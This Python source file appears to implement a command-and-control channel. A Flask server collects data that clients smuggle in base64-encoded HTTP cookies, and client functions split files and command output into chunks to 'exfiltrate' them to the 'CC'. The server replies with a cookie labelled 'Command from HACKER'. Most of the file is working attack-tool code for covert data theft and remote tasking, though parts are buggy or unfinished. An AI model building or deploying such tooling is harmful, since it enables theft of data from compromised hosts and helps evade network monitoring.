from time import sleep
from typing import Callable
from flask import Flask, request, Response


from threading import Lock
import base64

from queue import Queue
from sys import getsizeof
import base64

import io


import requests

from .client import Client


app = Flask(__name__)

CLIENTS = dict()
CLIENTS_LOCK = Lock()




URL = "http://127.0.0.1:8080/api"
commands = Queue()


@app.route("/api")
def communicate():
    req_header = request.headers
    req_cookies = request.cookies
    
    
    client_name = req_cookies.get('0')
    packet_id = req_cookies.get('1')
    packet_type = req_cookies.get('2')
    packet_data = req_cookies.get('3')
    
    with CLIENTS_LOCK:
        if client_name not in CLIENTS.keys():
            print("new connection")
            CLIENTS[client_name] = Client()


        client = CLIENTS[client_name]

    print(f"{client_name} - {packet_id} - {packet_type} - {packet_data} <=> {base64.b64decode(packet_data)}")

# if id missing request again

    if packet_type == 'stdout':
        client.get_stdout_queue().put(packet_data)

    elif 'file ' in packet_type :
        client.get_file_queue().put({'file': packet_type.replace('file ', ''),'data': packet_data})
        

    resp = Response()
    resp.set_cookie("0", "Command from HACKER", httponly=True)
    
    return resp




def gen_string_chunks(string: str, chunk_size: int = 256):
    for i in range(0, len(string), chunk_size):
        yield string[i:i + chunk_size]

def gen_file_chunks(stream: io.BufferedReader, chunk_size: int = 256):
    yield read_chunk_of_file(stream, chunk_size)


def gen_chunks(data, chunk_size: int = 1000):
    
    if isinstance(data, io.BufferedReader):
        chunk = read_chunk_of_file(data, chunk_size)
        while chunk:
            yield str(base64.b64encode(chunk), "utf-8")
            chunk = read_chunk_of_file(data, chunk_size)
        
    if isinstance(data, str):
        chunks = string_chunks(data, chunk_size)
        for chunk in chunks:
            yield str(base64.b64encode(str.encode(chunk)), "utf-8")

def gen_cookies(encryption_func: Callable, client_id, packet_id, data, type="", chunk_size: int = 100) -> dict:
    # prepare data to be exfiltrated

    cookies = {         # Max cookie size 4093 bytes
        '0': str(client_id),
        '1': str(packet_id),
        '2': str(type),  # Type [+ filename]
    }
    
    # 3: Data frame
    for chunk in gen_chunks(data, chunk_size):
        cookies['3'] = encryption_func(chunk)
        yield cookies

def communicate_to_cc(cookies: dict) -> dict:
    r = requests.get(URL, cookies=cookies)
    # extract instructions from CC
    return cookies


def read_file(filename: str):
    return open(filename, "rb")

def read_chunk_of_file(stream, chunk_size):
    return stream.read(chunk_size)

def write_file(filename: str):
    return open(filename, "ab")

def write_chunk_to_file(stream, chunk_size):
    return stream.write(chunk_size)

def string_chunks(string: str, chunk_size: int = 256):
    res = []
    for i in range(0, len(string), chunk_size):
        res.append(string[i:i + chunk_size])
    return res    

def communication_client_main(identifier: str, exfiltrate_queue: Queue,  instructions_queue: Queue, encryption_function: Callable,  time_between_requests: int = 4):
    while True:
        sleep(time_between_requests)
        element = exfiltrate_queue.get()
        print(element)
        if isinstance(element, dict):
            data_type = f"file {element['filename']}"
            data = element['data']
        else:
            data_type = "stdout"
            data = element

        for cookie in gen_cookies(encryption_function, identifier, "id", data, data_type):
            print("input:", base64.b64decode(cookie['3']))
            resp = communicate_to_cc(cookie)
            print(resp)
            instructions_queue.put(resp)
        
    # create cookie
    # commands.put( resp )


def communication_server_main(CLIENTS: dict, CLIENTS_LOCK: Lock, encryption_function: Callable, decryption_function: Callable):
    CLIENTS = CLIENTS
    CLIENTS_LOCK = CLIENTS_LOCK

    app.run("127.0.0.1", 8080, debug=True)